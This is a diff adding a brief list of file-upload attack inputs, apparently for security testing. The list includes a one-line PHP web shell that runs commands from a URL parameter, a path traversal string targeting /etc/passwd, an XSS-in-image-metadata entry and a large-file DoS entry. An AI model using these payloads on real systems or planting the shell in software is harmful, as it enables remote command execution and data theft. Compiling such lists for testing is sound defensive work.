@@ -1,0 +1,12 @@
+# PHP Shell Upload
+evil.php
+content: <?php system($_GET['cmd']); ?>
+
+# Path Traversal
+../../../etc/passwd
+
+# XSS in Image Metadata
+malicious.jpg with embedded <script>
+
+# Large File DoS
+10GB_file.zip
